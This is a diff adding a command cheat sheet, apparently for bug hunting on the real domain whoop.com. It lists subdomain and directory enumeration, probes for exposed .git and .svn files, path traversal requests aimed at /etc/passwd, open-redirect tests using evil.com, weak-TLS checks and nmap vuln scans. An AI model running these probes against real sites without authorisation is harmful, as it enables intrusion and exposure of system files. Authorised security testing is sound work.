@@ -1,0 +1,78 @@
+# Bug Hunting Commands - whoop.com
+
+## Subdomain Enumeration
+subfinder -d whoop.com -o subdomains.txt
+amass enum -d whoop.com -o amass.txt
+sublist3r -d whoop.com -o sublist3r.txt
+
+## DNS Enumeration
+dig whoop.com MX
+dig whoop.com NS
+dig whoop.com TXT
+nslookup -type=any whoop.com
+
+## Directory and File Discovery
+ffuf -u https://whoop.com/FUZZ -w common.txt
+ffuf -u https://whoop.com/FUZZ -w directory-list-2.3-medium.txt
+ffuf -u https://whoop.com/FUZZ -w raft-medium-directories.txt
+ffuf -u https://whoop.com/FUZZ -w raft-medium-files.txt
+ffuf -u https://whoop.com/FUZZ -w extensions_list.txt -e ".bak,.old,.config,.php.bak,.txt.bak"
+wfuzz -c -z file,common.txt --hc 404 https://whoop.com/FUZZ
+wfuzz -c -z file,directory-list-2.3-medium.txt --hc 404 https://whoop.com/FUZZ
+wfuzz -c -z file,raft-medium-directories.txt --hc 404 https://whoop.com/FUZZ
+wfuzz -c -z file,raft-medium-files.txt --hc 404 https://whoop.com/FUZZ
+wfuzz -c -z file,extensions_list.txt --hc 404 https://whoop.com/nice%20ports%2C/Tri%6Eity.txtFUZZ
+curl https://whoop.com/robots.txt
+
+## Backup Files
+curl https://whoop.com/.git/HEAD
+curl https://whoop.com/.svn/entries
+
+## HTTP Header Analysis
+curl -i https://whoop.com/
+curl -i https://whoop.com/nonexistent_page
+openssl s_client -connect whoop.com:443
+
+## Path Traversal
+curl https://whoop.com/../../etc/passwd
+curl https://whoop.com/../../../../etc/hosts
+curl https://whoop.com/....//....//etc/passwd
+
+## Error Handling
+curl -i https://whoop.com/nonexistent_file
+curl -i https://whoop.com/%00
+curl -i https://whoop.com/%27
+curl -i https://whoop.com/%22
+
+## Open Redirects
+curl "https://whoop.com/?redirect_uri=https://evil.com"
+curl "https://whoop.com/?url=https://evil.com"
+curl "https://whoop.com/?redirect=https://evil.com"
+
+## SSL/TLS Analysis
+openssl s_client -connect whoop.com:443 -cipher 'aNULL'
+openssl s_client -connect whoop.com:443 -tls1_1
+openssl s_client -connect whoop.com:443 -tls1_0
+
+## Nmap Scripting Engine (NSE)
+nmap --script vuln whoop.com
+nmap --script ssl-enum-ciphers -p 443 whoop.com
+nmap --script http-headers whoop.com
+nmap --script http-enum whoop.com
+
+## Vercel Specific Checks
+# Analyze "DEPLOYMENT_NOT_FOUND" messages. (Manual observation)
+
+## Wordlists (Use with ffuf/wfuzz)
+# common.txt
+# directory-list-2.3-medium.txt
+# raft-medium-directories.txt
+# raft-medium-files.txt
+# extensions_list.txt (create a custom list)
+
+## Additional Notes
+# Use Burp Suite or OWASP ZAP for interactive testing and payload injection.
+# Examine the port 80 redirection closely.
+# Examine the 404 errors on port 443 closely.
+# Manually test input fields for XSS and other vulnerabilities.
+# View page source to inspect javascript.
